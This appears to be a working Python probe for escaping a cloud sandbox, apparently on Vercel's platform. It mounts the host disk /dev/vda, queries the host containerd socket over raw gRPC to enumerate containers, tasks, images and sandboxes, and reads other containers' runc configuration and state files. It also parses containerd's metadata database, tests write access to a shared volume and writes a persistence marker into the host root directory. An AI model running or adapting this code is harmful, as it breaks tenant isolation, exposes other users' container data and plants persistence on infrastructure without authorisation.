# -*- coding: utf-8 -*-
"""vda33_share_probe: ns header + runc task 目录 + bolt 解析 + share 探测 + 持久化标记
P1: /volumes/run/vercel/share (rw 挂载) 探测
P2: containerd 带 namespace header 列表 (-D dump headers 看 trailers-only 错误)
P3: Sandbox service 探测
P4: runc task 目录 (config.json/state.json/shim.sock)
P5: meta.db bolt 浅解析 (bucket 树 + 容器 key)
P6: 持久化标记写 cell rootfs
输出落盘 + 哨兵 V33S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v33s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=4, ns=None):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:300]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


def p1():
    log('=== P1 share dir ===')
    for sp in ['/volumes/run/vercel/share', '/mnt/vdax/volumes/run/vercel/share']:
        try:
            log('exists %s: %s' % (sp, os.path.exists(sp)))
            if os.path.isdir(sp):
                names = sorted(os.listdir(sp))
                log('%s list(%d): %s' % (sp, len(names), names[:30]))
                wp = os.path.join(sp, '.v33_write_test')
                open(wp, 'w').write('v33 marker\n')
                log('%s WRITE OK' % sp)
                os.unlink(wp)
        except Exception as e:
            log('%s ERR %s' % (sp, e))


def p2():
    csp = '/mnt/vdax/run/containerd/containerd.sock'
    log('=== P2 ns header lists ===')
    for tag, path, payload in [
        ('Tasks', '/containerd.services.tasks.v1.Tasks/List', b''),
        ('Containers', '/containerd.services.containers.v1.Containers/List', b''),
        ('Images', '/containerd.services.images.v1.Images/List', b''),
        ('Snapshots', '/containerd.services.snapshots.v1.Snapshots/List', pstr(1, 'snapshotter==overlayfs')),
    ]:
        rc, out = curl_h2(csp, path, grpc_env(payload), t=3, ns='default')
        log('%s %s' % (tag, rc))
        show('%s body' % tag, out)
        time.sleep(0.15)
    rc, out = curl_h2(csp, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=3)
    log('Tasks-nons %s' % rc)
    show('Tasks-nons body', out)


def p3():
    csp = '/mnt/vdax/run/containerd/containerd.sock'
    log('=== P3 sandbox service ===')
    for tag, path in [
        ('SbList', '/containerd.services.sandboxsrv.v1.Sandbox/List'),
        ('SbGet', '/containerd.services.sandboxsrv.v1.Sandbox/Get'),
        ('SbContainers', '/containerd.services.sandboxsrv.v1.Sandbox/Controller'),
    ]:
        rc, out = curl_h2(csp, path, grpc_env(b''), t=3, ns='default')
        log('%s %s' % (tag, rc))
        show('%s body' % tag, out)
        time.sleep(0.15)


def p4():
    log('=== P4 runc task dirs ===')
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task'
    try:
        if os.path.isdir(base):
            for ns in sorted(os.listdir(base)):
                nsp = os.path.join(base, ns)
                try:
                    log('ns %s -> %s' % (ns, sorted(os.listdir(nsp))[:10]))
                except Exception as e:
                    log('ns %s ERR %s' % (ns, e))
                    continue
                for ctr in sorted(os.listdir(nsp)):
                    cp = os.path.join(nsp, ctr)
                    try:
                        log('ctr %s -> %s' % (ctr, sorted(os.listdir(cp))))
                    except Exception as e:
                        log('ctr %s ERR %s' % (ctr, e))
                        continue
                    for fn in ['config.json', 'state.json']:
                        fp = os.path.join(cp, fn)
                        try:
                            sz = os.path.getsize(fp)
                            head = open(fp, 'rb').read(2500).decode('utf-8', errors='replace')
                            log('%s (%d) head: %s' % (fn, sz, head[:900].replace('\n', ' ')))
                        except Exception as e:
                            log('%s ERR %s' % (fn, e))
        else:
            log('no task dir: %s' % base)
            rp = '/mnt/vdax/run/containerd'
            try:
                log('run/containerd: %s' % sorted(os.listdir(rp)))
            except Exception as e:
                log('run/containerd ERR %s' % e)
    except Exception as e:
        log('P4 ERR %s' % e)


def p5():
    log('=== P5 bolt parse ===')
    p = '/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
    try:
        data = open(p, 'rb').read()
        page_size = struct.unpack_from('<I', data, 8)[0]
        n_pages = len(data) // page_size
        log('page_size=%d size=%d n_pages=%d' % (page_size, len(data), n_pages))

        def page(pgid):
            off = pgid * page_size
            return data[off:off + page_size]

        root_pgid = None
        for m in (0, 1):
            mp = page(m)
            magic = struct.unpack_from('<I', mp, 0)[0]
            if magic == 0xED0CDAED:
                root_pgid = struct.unpack_from('<Q', mp, 16)[0]
                log('meta page=%d root_pgid=%d' % (m, root_pgid))
                break
        if root_pgid is None:
            log('no valid meta')
            return
        seen = set()
        out = []

        def walk(pgid, prefix, depth):
            if depth > 12 or pgid in seen or len(out) > 600:
                return
            seen.add(pgid)
            p = page(pgid)
            flags = struct.unpack_from('<H', p, 8)[0]
            count = struct.unpack_from('<H', p, 10)[0]
            pdata = p[16:]
            if flags & 1:  # branch
                for i in range(count):
                    e = pdata[i * 16:i * 16 + 16]
                    pos, ksize = struct.unpack_from('<II', e, 0)
                    pg = struct.unpack_from('<Q', e, 8)[0]
                    key = pdata[pos:pos + ksize].decode(errors='replace')
                    walk(pg, prefix + [key], depth + 1)
            elif flags & 2:  # leaf
                for i in range(count):
                    e = pdata[i * 16:i * 16 + 16]
                    fl, pos, ksize, vsize = struct.unpack_from('<IIII', e, 0)
                    key = pdata[pos:pos + ksize].decode(errors='replace')
                    val = pdata[pos + ksize:pos + ksize + vsize]
                    if vsize >= 16:
                        broot = struct.unpack_from('<Q', val, 0)[0]
                        if broot < n_pages:
                            bp = page(broot)
                            bflags = struct.unpack_from('<H', bp, 8)[0]
                            if bflags in (1, 2):
                                out.append(('/'.join(prefix + [key]), '<BUCKET>'))
                                walk(broot, prefix + [key], depth + 1)
                                continue
                    out.append(('/'.join(prefix + [key]), val[:100].decode(errors='replace')))

        walk(root_pgid, [], 0)
        buckets = [x[0] for x in out if x[1] == '<BUCKET>']
        log('buckets(%d): %s' % (len(buckets), buckets[:50]))
        interesting = []
        for bp, v in out:
            if v == '<BUCKET>':
                continue
            if any(k in bp for k in ['containers', 'sandbox', 'images', 'snapshots']) or 'ctr_' in v or 'sandbox' in bp.lower():
                interesting.append('%s = %s' % (bp, v[:90]))
        log('interesting(%d):' % len(interesting))
        for i in interesting[:50]:
            log('  %s' % i)
    except Exception as e:
        log('P5 ERR %s' % e)


def p6():
    log('=== P6 persist ===')
    try:
        top = sorted(os.listdir('/mnt/vdax'))[:50]
        log('vdax top(%d): %s' % (len(top), top))
    except Exception as e:
        log('vdax top ERR %s' % e)
    try:
        marker = '/mnt/vdax/root/.v33_persist_marker'
        open(marker, 'w').write('persist-test-v33 %s\n' % time.time())
        log('marker written: %s' % marker)
        log('readback: %s' % open(marker).read().strip())
        st = os.stat(marker)
        log('marker stat: uid=%d gid=%d mode=%o' % (st.st_uid, st.st_gid, st.st_mode))
    except Exception as e:
        log('marker ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    p1()
    p2()
    p3()
    p4()
    p5()
    p6()

    log('V33S_DONE')
    f.close()


if __name__ == '__main__':
    main()
